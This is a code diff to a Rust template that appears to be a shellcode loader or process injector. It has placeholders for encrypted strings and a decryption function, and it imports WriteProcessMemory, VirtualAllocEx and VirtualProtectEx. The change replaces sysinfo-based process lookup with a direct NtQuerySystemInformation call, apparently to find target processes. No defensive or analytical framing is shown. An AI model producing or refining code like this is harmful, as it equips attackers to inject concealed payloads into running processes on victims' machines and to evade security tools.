@@ -4,7 +4,8 @@
 {{LITCRYPT_SETUP}}
 {{COMMON_MODULE}}
 
-use sysinfo::System;
+use ntapi::ntexapi::{NtQuerySystemInformation, SystemProcessInformation};
+use ntapi::winapi::ctypes::c_void;
 use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
 use windows::Win32::System::Memory::VirtualAllocEx;
 use windows::Win32::System::Memory::VirtualProtectEx;
@@ -23,15 +24,14 @@ use std::thread;
 {{DECRYPTION_FUNCTION}}
 
 fn find_process_ids_by_name(tar: &str) -> Vec<usize> {
-    let mut dom: Vec<usize> = Vec::new();
-    let s = System::new_all();
-    let tar_lower = tar.to_lowercase();
-    for (_, pro) in s.processes() {
-        if pro.name().to_string_lossy().to_lowercase() == tar_lower {
-            dom.push(pro.pid().as_u32() as usize);
-        }
-    }
-    dom
+    common::find_process_ids_by_name(tar, |buffer, len| unsafe {
+        NtQuerySystemInformation(
+            SystemProcessInformation,
+            buffer as *mut c_void,
+            len as u32,
+            std::ptr::null_mut(),
+        )
+    })
 }
 
 fn pause(ms: u64) {
